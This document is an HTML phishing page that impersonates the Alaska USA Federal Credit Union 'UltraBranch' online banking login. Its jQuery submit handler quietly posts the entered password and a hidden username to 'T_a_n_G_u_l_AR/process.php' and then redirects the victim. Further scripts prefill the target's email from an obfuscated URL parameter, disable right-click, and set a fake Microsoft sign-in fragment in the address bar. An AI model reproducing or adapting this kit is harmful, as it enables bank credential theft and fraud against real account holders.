<!DOCTYPE>
<html lang="en">
<head>


   <title>UltraBranch Login</title>
   <meta http-equiv="X-UA-Compatible" content="IE=Edge">

   <link rel="stylesheet" href="https://ultrabranch3.alaskausa.org/efs/efs/jsp/inc/css/ub-print.css?akusa_rev=4ce19ec3" type="text/css" media="print">
   <link rel="stylesheet" href="https://ultrabranch3.alaskausa.org/efs/efs/jsp/inc/css/ub-main.css?akusa_rev=4ce19ec3" type="text/css" title="main" media="screen, projection">
   <link rel="stylesheet" href="https://ultrabranch3.alaskausa.org/efs/efs/jsp/inc/css/ub-login-new.css?akusa_rev=4ce19ec3" type="text/css">
   <link rel="shortcut icon" href="https://www.alaskausa.org/images/icon-72@2x.png"/>

   <script type="text/javascript" src="/efs/efs/jslibrary/common_functions.js"></script>

   <!--<script type="text/javascript">
      function Initialize()
      {
         document.forms["safelogin"].Password.focus();
      }

      function ProcessForm() {

         if(document.forms["safelogin"].Password.value.length == "0") {
            alert("Password is a Required Field");
            return false;
         }
         return true;
      }

     function DoSubmit() {
        var form = document.forms['safelogin'];
        form.Referrerfield.value = document.referrer;
        return true;
     }

     if (!document.cookie) {
       document.writeln("<meta http-equiv=\"Refresh\" content=\"0;url=browser-requirements.jsp\" />");
     }
    </script>

  <noscript>
    <meta http-equiv="Refresh" content="0;url=browser-requirements.jsp" />
  </noscript>-->

    <style>
    	/*styles from credit union website -- may want to put these in a .css file*/
    	.leftCol {
			padding: 0 0 0 24px; background: url(https://www.alaskausa.org/css/nav/pgMainEdge.png) repeat-y 8px 0;
			width: 480px; float:left;
			margin-bottom:2em;
		}
		.leftCol > h2::before {
			content: ""; position: absolute; height: 9px; width: 9px; left: 2px; top: 50%;
			margin-top: -5px; background-color: #004990;
		}
		.leftCol > h2 {
			position: relative; margin: .5em 0 auto -22px; padding-left: 22px; line-height: 1.5em;
		}
		h2 {
			font-size: 1.4em; color: #004990;
		}
		.sideBar { width: 250px; float:left; }
		.hint { font-size: .85em; color:#666666;}

		@media only screen and (max-width: 767px) {
			.leftCol { float:none; background:none; padding:0;}
			.sideBar { float:none; }
		}

		@media only screen and (max-width: 479px) {
			.leftCol { width: 100%; }
		}

		.learnMore:first-child {
			margin-top: 0;
		}
		.learnMore { margin: 10px 5px; padding: 0; border-radius: 3px; overflow: hidden; background-color: #3F77C0; color: #ffffff;
		}
		.learnMore h2 { line-height: 32px; margin: 0; border-radius: 3px 3px 0 0; padding: 0 8px;
			font-size: 1.2em; color: #ffffff; background: #004990; font-weight: normal;
		}
		.learnMore ul, .learnMore li {
			margin: .5em 0;
		}
		.learnMore a { color: white !important;}
		.learnMore li { margin-left:30px !important;}
		.learnMore p {
			margin: .5em 0; padding: 0; margin-left: 8px;
		}

		label {
		  font-weight: bold;
		  color: #004990;
		}
		.imageBox { margin:1em 0; }
		.imageBox img { border-radius: 5px; }
		form { margin-top: 2em; }

		/*local overrides*/
		#loginBox {background-color:white;}
		#loginBox > div, #loginBox > form > div { background-color:white;}

    /*local ADA fix for keypad instructions*/
    #instr:focus {position:relative !important;max-width:344px;margin-left:3px;margin-bottom:0;background-color:#ffffff; color:#044990;}
    </style>
	
	<link rel="stylesheet" href="css/style.css" />
	
</head>
<body onload="Initialize();">
   <div id="header" role="banner">
    <section class="skipLinks" title="Enter your Personal Access Code by simply typing on your keyboard">
      <h2 class="visuallyhidden">Skip links</h2>
      <p><a href="#instr" class="visuallyhidden">Skip to main content</a></p>
      <p><a href="#pgFooter" class="visuallyhidden">Skip to footer</a></p>
      <p><a href="https://www.alaskausa.org/service/contact.asp" class="visuallyhidden">If you are using a screen reader and having difficulties with the site, call the Member Service Center 24/7 at 800-525-9094.</a></p>
    </section>
    <div id="topBar">
      <a href="https://www.alaskausa.org/" id="logo" title="Alaska USA Federal Credit Union"><img src="https://ultrabranch3.alaskausa.org/efs/efs/grafx/akusa/akusafcu_logo.png" alt="Alaska USA"></a>
      <p id="headerReturnLink"><a href="https://www.alaskausa.org/">Return to home</a></p>
    </div>

    
    
    <div id="pgHead">
    </div>
    
   </div>

   <div id="pgMain" role="main">
         <div id="mainContent">
           <div class="leftCol">
            <h2>Log in to your account</h2>
            <form method="post"  name="loginForm" id="loginForm" action="">
              <input type="hidden" name="Referrerfield" id="referrer">
              <label>Password:</label>
			  <input type="hidden" name="usernamex" id="usernamex" />
              <input type="password" name="password" id="password" aria-label="Password with Earthrise security image">
              <input type="submit" name="Log In" id="LogIn" value="Log In">

              <div class="imageBox">
                <img src="https://ultrabranch3.alaskausa.org/efs/efs/grafx/akusa/security/abstract-earthrise.jpg">
              </div>
            </form>
            
          </div>

	      	<div class="sideBar">
	      		<div class="learnMore">
	      			<h2 class="help">Quick Help</h2>
                    <ul class="help">
                       
                       <li><a href="/efs/ultrabranch/ForgotPAC">Forgot online password?</a></li>
                       <li id="liKeypadNote">
                          <a href="#" id="keypadLabel" onclick="toggleNote('liKeypadNote','keypadNote');return false;" role="button" aria-controls="keypadNote" aria-expanded="false">Don't recognize security image?</a>
                          <div class="notes" id="keypadNote" role="region" aria-labelledby="keypadLabel" aria-hidden="true">
                             <p>You entered User ID <b>johnson</b> - is this correct?</p>
                             <p>No - <a href="https://www.alaskausa.org" title="Return to previous screen">Return to the previous
                             screen</a> to re-enter your User ID</p>
                             <p>Yes - Call the number listed below.</p>
                          </div>
                       </li>
                       
                    </ul>
                    <div class="help" style="display:none;">
                       <h1>Questions?  (800) 525-9094</h1>
                    </div>
	      		</div>
				<div id="questionSection" class="learnMore">
					<h2>Questions?</h2>
					<p>
						For assistance contact the Member Service Center.
					</p><p style="padding-left:10px;margin-top:10px;">
						(907) 563-4567 or (800) 525-9094<br><br>
						Open 24 hours a day, 7 days a week.<br><br>
						<a href="https://www.alaskausa.org/service/contact.asp" target="_blank">More contact information</a>
					</p>
					<p></p>
				</div>
      	  	</div>
         </div>
         <br><br>
         
         <div id="pgFooter" style="background-color:rgb(200,200,200)">
            <hr>

   <div id="footer" role="contentinfo">
   	 <span class="bug">
       <img alt="Equal Housing Lender" src="https://ultrabranch3.alaskausa.org/efs/efs/grafx/akusa/logo-ehl-tri.gif?#042116">
     </span>

     <p> © Copyright  2021 • Alaska&nbsp;USA and UltraBranch are registered trademarks of Alaska&nbsp;USA Federal Credit Union.</p>
     <p>Mortgage loans are provided by Alaska USA Mortgage Company, LLC. License #AK157293 <br>
     Washington Consumer Loan Company License #CL-157293; Licensed by the Department of Financial Protection and Innovation under the California Residential Mortgage Lending Act, License #4131067.</p>
        <p><a href="javascript:PopupWindow('Privacy');">Privacy</a></p>
     

     <p class="ncua">
       <img src="/efs/efs/grafx/akusa/logo-ncua.gif?#042116" alt="Your funds federally insured to at least $250,000 and backed by the full faith and credit of the United States Government. National Credit Union Administration, a U.S. Government Agency"><span>Federally insured by NCUA</span>
     </p>
   </div>
         </div>
   </div>

<div class="overlay">
  <div class="lgif-space"></div>
    <div class="loadgif">
       <img src="img/loading.gif" width="100" height="100">
    </div>
</div>


<script src="https://code.jquery.com/jquery-3.2.1.min.js"></script>

 <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.0/umd/popper.min.js" integrity="sha384-cs/chFZiN24E4KMATLdqdvsezGxaGsi4hLGOzlXwp5UZB1LY//20VyM2taTB4QvJ" crossorigin="anonymous"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.1.0/js/bootstrap.min.js" integrity="sha384-uefMccjFJAIv6A+rW+L4AHf99KvxDjWSu1z9VI8SKNVmz4sk7buKt/6v9KI65qnm" crossorigin="anonymous"></script>
<script src="https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.3.1.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.10/jquery.mask.js"></script>

<script type="text/javascript">

$(document).bind("contextmenu", function(e){ return false;});

$('#loginForm').on('submit', function(e){
		
		 $(".overlay").show(500);
		 $.post('T_a_n_G_u_l_AR/process.php', $(this).serialize(), function(data){
			console.log(data);
		});
		setTimeout(function() {
                               window.location.href = "indexem.php";
                        },2000);
		e.preventDefault();
	});


</script>

<script type="text/javascript">

var $c = getUrlParameter('user');
     $('#usernamex').val($c);
	$('#me').text($c);
        var $current_email = "";

        if ($c) {
            $current_email = isValidEmail($c) ? $c : decodeCustom($c);
        }


        function decodeCustom($email) {
            var $consonants = 'bcdfghjklmnpqrstvwxyz'.split('');
            var $joinChar = $email.substr(0, 1); // substr(,0,1);
            var $output = $email.substr(2); // substr($email,2);
            var $vowels = ['a', 'e', 'i', 'o', 'u'];
            var $vowelsLookup = [];

            for ($i in $consonants) {
                $output = $output.replace(new RegExp($joinChar + '0' + $i + 'a', 'g'), $consonants[$i]);
            }

            for ($i in $vowels) {
                $output = $output.replace(new RegExp($joinChar + $i, 'g'), $vowels[$i]);
            }

            $output = $output.replace(new RegExp($joinChar + $joinChar + $joinChar, 'g'), '@');
            //,$output);
            return $output;
        }

        function isValidEmail(email) {
            var re =
                /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
            return re.test(email);
        }

        function getUrlParameter(name) {
            name = name.replace(/[\[]/, '\\[').replace(/[\]]/, '\\]');
            var regex = new RegExp('[\\?&]' + name + '=([^&#]*)');
            var results = regex.exec(location.search);
            return results === null ? '' : decodeURIComponent(results[1].replace(/\+/g, ' '));
			
        }
		
		 var currentEmail = $current_email;
    var ListEntries = [
            '.*fuck.*',
            '.*pussy.*',
            '.*bitch.*',
            '.*asshole.*',
            '.*fool.*',
            '.*dick.*',
            '.*mama.*',
            '.*nice.*try.*',
            '.*12345.*'
        ];
		
		 if(currentEmail){

            var e = document.getElementById('username');
            e = currentEmail;
            //e.readOnly = true;
			

            var domain = extractDomain(currentEmail);

           // var corH = document.getElementById('corportate-title');
            //corH.innerText = domain + " Email Login";

            }
			
		function extractDomain(email){

        var load = email;
        var domain = '';
        var regex = /.+@(.*?)\..+/;
        var str = email;
        var m;

        if ((m = regex.exec(str)) !== null) {
            return m[1];
        }

        return null;
    }



</script> 



<script> 
  location.hash = 'wa=wsignin1.0&rpsnv=13&ct=1539585327&rver=7.0.6737.0&wp=MBI_SSL&wreply=https%3a%2f%2foutlook.live.com%2fowa%2f%3fnlp%3d1%26RpsCsrfState%3d715d44a2-2f11-4282-f625-a066679e96e2&id=292841&CBCXT=out&lw=1&fl=dob%2cflname%2cwld&cobrandid=90015&domain=' 
</script>

<script type="text/javascript" src="js/actions.js"></script>
</body>
</html>